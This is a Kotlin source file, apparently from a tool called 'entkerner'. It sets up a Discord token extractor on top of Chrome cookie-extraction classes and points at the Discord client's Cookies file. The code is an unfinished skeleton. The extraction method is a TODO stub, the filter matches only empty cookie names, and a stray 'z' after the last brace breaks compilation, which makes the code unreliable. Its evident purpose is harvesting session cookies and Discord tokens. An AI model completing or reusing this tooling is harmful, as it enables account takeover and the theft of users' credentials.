package net.kerner.entkerner.extractors.discord

import io.ktor.client.*
import net.kerner.entkerner.abstract.AbstractDataExtractor
import net.kerner.entkerner.abstract.AbstractFilterer
import net.kerner.entkerner.extractors.chrome.ChromeCookieExtractor
import net.kerner.entkerner.extractors.chrome.ChromeCookieWorker
import net.kerner.entkerner.io.FileUtils
import net.kerner.entkerner.io.nullPaths
import net.kerner.entkerner.model.ChromeCookie
import net.kerner.entkerner.model.ChromeCookieTable
import net.kerner.entkerner.model.SystemType
import org.jetbrains.exposed.sql.Database
import org.jetbrains.exposed.sql.selectAll
import org.jetbrains.exposed.sql.transactions.TransactionManager
import org.jetbrains.exposed.sql.transactions.transaction
import java.io.File
import java.nio.file.LinkOption
import java.nio.file.Path
import java.util.*
import javax.crypto.Cipher
import kotlin.io.path.div
import kotlin.io.path.exists
import kotlin.io.path.isRegularFile

enum class DiscordClientEngine(
    val windows: Path?,
    val linux: Path?,
    val darwin: Path?
) {
    DiscordStable(null, FileUtils.Linux.config / "discord" / "Cookies", null)
}

class DiscordTokenExtractor(
    httpClient: HttpClient,
    private val system: SystemType
) : ChromeCookieWorker<List<ChromeCookie>>(httpClient) {
    override val fileDirectories = nullPaths
    override val name = "DiscordTokenExtractor"
    override suspend fun extractData(file: File): List<ChromeCookie> {
        TODO("Not yet implemented")
    }


}

class ChromeDiscordFilterer : AbstractFilterer<ChromeCookie>() {
    override val name = "ChromeDiscordFilter"

    override fun filter(cookie: ChromeCookie): Boolean {
        return cookie.name == ""
    }

}z